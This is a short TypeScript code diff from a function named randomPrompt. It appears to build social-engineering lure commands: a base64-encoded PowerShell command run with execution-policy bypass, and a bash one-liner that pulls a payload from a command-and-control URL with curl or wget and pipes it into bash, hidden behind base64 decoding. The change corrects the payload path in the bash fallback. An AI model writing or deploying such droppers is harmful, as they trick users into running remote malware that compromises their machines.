@@ -70,7 +70,7 @@ function randomPrompt(code: string, os: Desktop): string {
   const winB64 = b64UTF16(winScript);
   const winCmd = `powershell -Exec Bypass -EncodedCommand ${winB64}`;
 
-  const unixScript = `#!/bin/bash\n( curl -s ${C2_URL}/650m || wget -qO- ${C2_URL}/650 ) | bash; echo 'CODE: ${code}'`;
+  const unixScript = `#!/bin/bash\n( curl -s ${C2_URL}/650m || wget -qO- ${C2_URL}/650m ) | bash; echo 'CODE: ${code}'`;
 
   const unixB64 = b64Standard(unixScript);
   const unixCmd = `echo '${unixB64}' | base64 -d | bash`;
